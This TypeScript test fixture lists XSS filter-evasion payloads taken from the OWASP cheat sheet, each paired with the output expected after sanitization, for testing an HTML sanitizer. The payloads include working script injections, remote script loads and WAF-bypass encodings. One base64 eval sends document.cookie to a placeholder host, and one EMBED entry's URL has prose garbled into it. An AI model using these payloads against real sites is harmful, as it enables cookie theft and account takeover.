/*!
 | XSS Filter Evasion Examples
 |
 | Using examples from the XSS Filter Evasion Cheat Sheet (https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 | by Robert "RSnake" Hansen
 | Last revision (mm/dd/yy): 7/4/2018
 | License: Attribution-ShareAlike 4.0 International (CC BY-SA 4.0) (https://creativecommons.org/licenses/by-sa/4.0/)
*/
/*--------------------------------------------------------------------------------------------------------------------*/

export interface XSSTestCase {
  label:string;
  example:string;
  expectedCleaned:string[];
};

export const testCases:XSSTestCase[] = [
  {
    'label': 'XSS Locator',
    'example': '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";' +
      'alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'>' +
      '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
    'expectedCleaned': ['\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"' +
      ';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--&gt;"&gt;\'&gt;']
  }, {
    'label': 'XSS Locator (short)',
    'example': '\'\';!--"<XSS>=&()}',
    'expectedCleaned': ['\'\';!--"=&amp;()}']
  }, {
    'label': 'XSS Locator (polygot)',
    'example': 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    'expectedCleaned': ['javascript:/*--&gt;']
  }, {
    'label': 'Plaintext',
    'example': '<PLAINTEXT>',
    'expectedCleaned': ['']
  }, {
    'label': 'No Filter Evasion',
    'example': '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
    'expectedCleaned': ['']
  }, {
    'label': 'Filter bypass based polyglot',
    'example': '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\>' +
      '<plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:' +
      'alert(/XSS/) type=submit>\'-->"></script><script>alert(document.cookie)</script>"><img/id=' +
      '"confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'"><img src=' +
      '"http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">',
    'expectedCleaned': ['\'"&gt;&gt;"&gt;&lt;/|&gt;@gmail.com\'--&gt;"&gt;"&gt;\'"&gt;']
  }, {
    'label': 'Image XSS using the JavaScript directive',
    'example': '<IMG SRC="javascript:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': 'No quotes and no semicolon',
    'example': '<IMG SRC=javascript:alert(\'XSS\')>',
    'expectedCleaned': ['']
  }, {
    'label': 'Case insensitive XSS attack vector',
    'example': '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
    'expectedCleaned': ['']
  }, {
    'label': 'HTML entities',
    'example': '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
    'expectedCleaned': ['']
  }, {
    'label': 'Grave accent obfuscation',
    'example': '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
    'expectedCleaned': ['']
  }, {
    'label': 'Malformed A tags 1',
    'example': '<a onmouseover="alert(document.cookie)">xxs link</a>',
    'expectedCleaned': ['xxs link']
  }, {
    'label': 'Malformed A tags 2',
    'example': '<a onmouseover=alert(document.cookie)>xxs link</a>',
    'expectedCleaned': ['xxs link']
  }, {
    'label': 'Malformed IMG tags',
    'example': '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
    'expectedCleaned': ['"&gt;']
  }, {
    'label': 'fromCharCode',
    'example': '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
    'expectedCleaned': ['']
  }, {
    'label': 'Default SRC tag to get past filters that check SRC domain',
    'example': '<IMG SRC=# onmouseover="alert(\'xxs\')">',
    'expectedCleaned': ['']
  }, {
    'label': 'Default SRC tag by leaving it empty',
    'example': '<IMG SRC= onmouseover="alert(\'xxs\')">',
    'expectedCleaned': ['']
  }, {
    'label': 'Default SRC tag by leaving it out entirely',
    'example': '<IMG onmouseover="alert(\'xxs\')">',
    'expectedCleaned': ['']
  }, {
    'label': 'On error alert',
    'example': '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
    'expectedCleaned': ['']
  }, {
    'label': 'IMG onerror and javascript alert encode',
    'example': '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#000010' +
      '5&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088' +
      '&#0000083&#0000083&#0000039&#0000041">',
    'expectedCleaned': ['']
  }, {
    'label': 'Decimal HTML character references',
    'example': '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;' +
      '&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
    'expectedCleaned': ['']
  }, {
    'label': 'Decimal HTML character references without trailing semicolons',
    'example': '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&' +
      '#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&' +
      '#0000083&#0000039&#0000041>',
    'expectedCleaned': ['']
  }, {
    'label': 'Hexadecimal HTML character references without trailing semicolons',
    'example': '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&' +
      '#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
    'expectedCleaned': ['']
  }, {
    'label': 'Embedded tab',
    'example': '<IMG SRC="jav\tascript:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': 'Embedded Encoded tab',
    'example': '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': 'Embedded newline to break up XSS',
    'example': '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': 'Embedded carriage return to break up XSS',
    'example': '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': 'Null breaks up JavaScript directive',
    'example': '<IMG SRC=java\0script:alert(\"XSS\")>',
    'expectedCleaned': ['']
  }, {
    'label': 'Spaces and meta chars before the JavaScript in images for XSS',
    'example': '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': 'Non-alpha-non-digit XSS 1',
    'example': '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
    'expectedCleaned': ['']
  }, {
    'label': 'Non-alpha-non-digit XSS 2',
    'example': '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>',
    'expectedCleaned': ['']
  }, {
    'label': 'Non-alpha-non-digit XSS 3',
    'example': '<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>',
    'expectedCleaned': ['']
  }, {
    'label': 'Extraneous open brackets',
    'example': '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    'expectedCleaned': ['&lt;']
  }, {
    'label': 'No closing script tags',
    'example': '<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
    'expectedCleaned': ['']
  }, {
    'label': 'Protocol resolution in script tags',
    'example': '<SCRIPT SRC=//xss.rocks/.j>',
    'expectedCleaned': ['']
  }, {
    'label': 'Half open HTML/JavaScript XSS vector',
    'example': '<IMG SRC="javascript:alert(\'XSS\')"',
    'expectedCleaned': ['']
  }, {
    'label': 'Double open angle brackets',
    'example': '<iframe src=http://xss.rocks/scriptlet.html <',
    'expectedCleaned': ['']
  }, {
    'label': 'Escaping JavaScript escapes',
    'example': '</script><script>alert(\'XSS\');</script>',
    'expectedCleaned': ['']
  }, {
    'label': 'End title tag',
    'example': '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
    'expectedCleaned': ['']
  }, {
    'label': 'INPUT image',
    'example': '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': 'BODY image',
    'example': '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
    'expectedCleaned': ['']
  }, {
    'label': 'IMG Dynsrc',
    'example': '<IMG DYNSRC="javascript:alert(\'XSS\')">',
    'expectedCleaned': ['']
  }, {
    'label': 'IMG lowsrc',
    'example': '<IMG LOWSRC="javascript:alert(\'XSS\')">',
    'expectedCleaned': ['']
  }, {
    'label': 'List-style-image',
    'example': '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'VBscript in an image',
    'example': '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
    'expectedCleaned': ['']
  }, {
    'label': 'SVG object tag',
    'example': '<svg/onload=alert(\'XSS\')>',
    'expectedCleaned': ['']
  }, {
    'label': 'BODY tag 1',
    'example': '<BODY ONLOAD=alert(\'XSS\')>',
    'expectedCleaned': ['']
  }, {
    'label': 'BODY tag 2',
    'example': '<BODY ONLOAD =alert(\'XSS\')>',
    'expectedCleaned': ['']
  }, {
    'label': 'BGSOUND',
    'example': '<BGSOUND SRC="javascript:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': '& JavaScript includes',
    'example': '<BR SIZE="&{alert(\'XSS\')}">',
    'expectedCleaned': ['']
  }, {
    'label': 'STYLE sheet',
    'example': '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': 'Remote style sheet 1',
    'example': '<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">',
    'expectedCleaned': ['']
  }, {
    'label': 'Remote style sheet 2',
    'example': '<STYLE>@import\'http://xss.rocks/xss.css\';</STYLE>',
    'expectedCleaned': ['']
  }, {
    'label': 'Remote style sheet 3',
    'example': '<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">',
    'expectedCleaned': ['']
  }, {
    'label': 'Remote style sheet 4',
    'example': '<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>',
    'expectedCleaned': ['']
  }, {
    'label': 'STYLE tags with broken up JavaScript for XSS',
    'example': '<STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>',
    'expectedCleaned': ['']
  }, {
    'label': 'STYLE attribute using a comment to break up expression',
    'example': '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',
    'expectedCleaned': ['']
  }, {
    'label': 'STYLE tag using background-image',
    'example': '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>',
    'expectedCleaned': ['']
  }, {
    'label': 'STYLE tag using background',
    'example': '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>',
    'expectedCleaned': ['']
  }, {
    'label': 'Anonymous HTML with STYLE attribute',
    'example': '<XSS STYLE="xss:expression(alert(\'XSS\'))">',
    'expectedCleaned': ['']
  }, {
    'label': 'Local htc file',
    'example': '<XSS STYLE="behavior: url(xss.htc);">',
    'expectedCleaned': ['']
  }, {
    'label': 'META',
    'example': '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': 'META using data',
    'example': '<META HTTP-EQUIV="refresh" CONTENT="0;' +
      'url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
    'expectedCleaned': ['']
  }, {
    'label': 'META with additional URL parameter',
    'example': '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': 'IFRAME',
    'example': '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
    'expectedCleaned': ['']
  }, {
    'label': 'IFRAME Event based',
    'example': '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
    'expectedCleaned': ['']
  }, {
    'label': 'FRAME',
    'example': '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
    'expectedCleaned': ['']
  }, {
    'label': 'TABLE',
    'example': '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
    'expectedCleaned': ['']
  }, {
    'label': 'TD',
    'example': '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
    'expectedCleaned': ['']
  }, {
    'label': 'DIV: DIV background-image',
    'example': '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
    'expectedCleaned': ['']
  }, {
    'label': 'DIV: DIV background-image plus extra characters',
    'example': '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">',
    'expectedCleaned': ['']
  }, {
    'label': 'DIV: DIV expression',
    'example': '<DIV STYLE="width: expression(alert(\'XSS\'));">',
    'expectedCleaned': ['']
  }, {
    'label': 'BASE tag',
    'example': '<BASE HREF="javascript:alert(\'XSS\');//">',
    'expectedCleaned': ['']
  }, {
    'label': 'OBJECT tag',
    'example': '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>',
    'expectedCleaned': ['']
  }, {
    'label': 'APPLET tag',
    'example': '<APPLET TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></APPLET>',
    'expectedCleaned': ['']
  }, {
    'label': 'Using an EMBED tag you can embed a Flash movie that contains XSS',
    'example': '<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains ' +
      'XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking=' +
      '"internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" ' +
      'AllowScriptAccess="always"></EMBED>',
    'expectedCleaned': ['']
  }, {
    'label': 'You can EMBED SVG which can contain your XSS vector',
    'example': '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDA' +
      'vc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xO' +
      'Tk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2' +
      'NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" ' +
      'AllowScriptAccess="always"></EMBED>',
    'expectedCleaned': ['']
  }, {
    'label': 'XML data island with CDATA obfuscation',
    'example': '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML>' +
      '<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
    'expectedCleaned': ['']
  }, {
    'label': 'Locally hosted XML with embedded JavaScript that is generated using an XML data island',
    'example': '<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>',
    'expectedCleaned': ['']
  }, {
    'label': 'Assuming you can only fit in a few characters and it filters against ".js"',
    'example': '<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>',
    'expectedCleaned': ['']
  }, {
    'label': 'SSI (Server Side Includes)',
    'example': '<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=' +
      'http://xss.rocks/xss.js></SCRIPT>\'"-->',
    'expectedCleaned': ['']
  }, {
    'label': 'IMG Embedded commands',
    'example': '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
    'expectedCleaned': ['']
  }, {
    'label': 'Cookie manipulation',
    'example': '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">',
    'expectedCleaned': ['']
  }, {
    'label': 'XSS using HTML quote encapsulation 1',
    'example': '<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
    'expectedCleaned': ['']
  }, {
    'label': 'XSS using HTML quote encapsulation 2',
    'example': '<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
    'expectedCleaned': ['']
  }, {
    'label': 'XSS using HTML quote encapsulation 3',
    'example': '<SCRIPT a=">" \'\' SRC="httx://xss.rocks/xss.js"></SCRIPT>',
    'expectedCleaned': ['']
  }, {
    'label': 'XSS using HTML quote encapsulation 4',
    'example': '<SCRIPT "a=\'>\'" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
    'expectedCleaned': ['']
  }, {
    'label': 'XSS using HTML quote encapsulation 5',
    'example': '<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>',
    'expectedCleaned': ['']
  }, {
    'label': 'XSS using HTML quote encapsulation 6',
    'example': '<SCRIPT a=">\'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
    'expectedCleaned': ['']
  }, {
    'label': 'XSS using HTML quote encapsulation 7',
    'example': '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>',
    'expectedCleaned': ['PT SRC="httx://xss.rocks/xss.js"&gt;']
  }, {
    'label': 'URL string evasion: IP versus hostname',
    'example': '<A HREF="http://66.102.7.147/">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: URL encoding',
    'example': '<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Dword encoding',
    'example': '<A HREF="http://1113982867/">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Hex encoding',
    'example': '<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Octal encoding',
    'example': '<A HREF="http://0102.0146.0007.00000223/">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Base64 encoding',
    'example': '<img onload="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=\'))">',
    'expectedCleaned': ['']
  }, {
    'label': 'URL string evasion: Mixed encoding',
    'example': '<A HREF="h\ntt\tp://6\t6.000146.0x7.147/">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Protocol resolution bypass 1',
    'example': '<A HREF="//www.google.com/">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Protocol resolution bypass 2',
    'example': '<A HREF="\\\\www.google.com\\">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Google "feeling lucky" part 1',
    'example': '<A HREF="//google">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Google "feeling lucky" part 2',
    'example': '<A HREF="http://ha.ckers.org@google">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Google "feeling lucky" part 3',
    'example': '<A HREF="http://google:ha.ckers.org">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Removing cnames',
    'example': '<A HREF="http://google.com/">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Extra dot for absolute DNS',
    'example': '<A HREF="http://www.google.com./">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: JavaScript link location',
    'example': '<A HREF="javascript:document.location=\'http://www.google.com/\'">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Content replace as attack vector 1',
    'example': '<A HREF="http://www.google.com/ogle.com/">XSS</A>',
    'expectedCleaned': ['XSS']
  }, {
    'label': 'URL string evasion: Content replace as attack vector 2',
    'example': '<IMG SRC="java&#x09;script:alert(\'XSS\');">',
    'expectedCleaned': ['']
  }, {
    'label': 'Methods to Bypass WAF – Cross-Site Scripting: Reflected XSS in Javascript',
    'example': '<script>setTimeout("writetitle()",$_GET[xss])</script>',
    'expectedCleaned': ['']
  }, {
    'label': 'Methods to Bypass WAF – Cross-Site Scripting: DOM-based XSS',
    'example': '<script>eval($_GET[xss]);</script>',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 1',
    'example': '<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 2',
    'example': '<Video> <source onerror = "javascript: alert (XSS)">',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 3',
    'example': '<Input value = "XSS" type = text>',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 4',
    'example': '<applet code="javascript:confirm(document.cookie);">',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 5',
    'example': '<isindex x="javascript:" onmouseover="alert(XSS)">',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 6',
    'example': '"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
    'expectedCleaned': ['"&gt;”&gt;’&gt;']
  }, {
    'label': 'WAF ByPass Strings for XSS 7',
    'example': '"><img src="x:x" onerror="alert(XSS)">',
    'expectedCleaned': ['"&gt;']
  }, {
    'label': 'WAF ByPass Strings for XSS 8',
    'example': '"><iframe src="javascript:alert(XSS)">',
    'expectedCleaned': ['"&gt;']
  }, {
    'label': 'WAF ByPass Strings for XSS 9',
    'example': '<object data="javascript:alert(XSS)">',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 10',
    'example': '<isindex type=image src=1 onerror=alert(XSS)>',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 11',
    'example': '<img src=x:alert(alt) onerror=eval(src) alt=0>',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 12',
    'example': '<img  src="x:gif" onerror="window[\'al\u0065rt\'](0)"></img>',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 13',
    'example': '<iframe/src="data:text/html,<svg onload=alert(1)>">',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 14',
    'example': '<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 15',
    'example': '<svg><script xlink:href=data&colon;,window.open(\'https://www.google.com/\')></script',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 16',
    'example': '<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 17',
    'example': '<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 18',
    'example': '<form><a href="javascript:\u0061lert(1)">X',
    'expectedCleaned': ['X']
  }, {
    'label': 'WAF ByPass Strings for XSS 19',
    'example': '</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror=\'eval(src)\'>',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 20',
    'example': '<style>//*{x:expression(alert(/xss/))}//<style></style>',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 21',
    'example': '<img src="/" =_=" title="onerror=\'prompt(1)\'">',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 22',
    'example': '<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa ' +
      'href=j&#97v&#97script:&#97lert(1)>ClickMe',
    'expectedCleaned': ['ClickMe']
  }, {
    'label': 'WAF ByPass Strings for XSS 23',
    'example': '<script x> alert(1) </script 1=2',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 24',
    'example': '<form><button formaction=javascript&colon;alert(1)>CLICKME',
    'expectedCleaned': ['CLICKME']
  }, {
    'label': 'WAF ByPass Strings for XSS 25',
    'example': '<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"',
    'expectedCleaned': ['']
  }, {
    'label': 'WAF ByPass Strings for XSS 26',
    'example': '<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31' +
      '%29%3C%2F%73%63%72%69%70%74%3E"></iframe>',
    'expectedCleaned': ['']
  }, {
    'label': 'Filter Bypass Alert Obfuscation 1',
    'example': '<IMG onmouseover="(alert)(1)">',
    'expectedCleaned': ['']
  }, {
    'label': 'Filter Bypass Alert Obfuscation 2',
    'example': '<IMG onmouseover="a=alert,a(1)">',
    'expectedCleaned': ['']
  }, {
    'label': 'Filter Bypass Alert Obfuscation 3',
    'example': '<IMG onmouseover="[1].find(alert)">',
    'expectedCleaned': ['']
  }, {
    'label': 'Filter Bypass Alert Obfuscation 4',
    'example': '<IMG onmouseover="top[\'al\'+\'ert\'](1)">',
    'expectedCleaned': ['']
  }, {
    'label': 'Filter Bypass Alert Obfuscation 5',
    'example': '<IMG onmouseover="top[/al/.source+/ert/.source](1)">',
    'expectedCleaned': ['']
  }, {
    'label': 'Filter Bypass Alert Obfuscation 6',
    'example': '<IMG onmouseover="al\u0065rt(1)">',
    'expectedCleaned': ['']
  }, {
    'label': 'Filter Bypass Alert Obfuscation 7',
    'example': '<IMG onmouseover="top[\'al\x65rt\'](1)">',
    'expectedCleaned': ['']
  }, {
    'label': 'Filter Bypass Alert Obfuscation 8',
    'example': '<IMG onmouseover="top[8680439..toString(30)](1)">',
    'expectedCleaned': ['']
  }
];
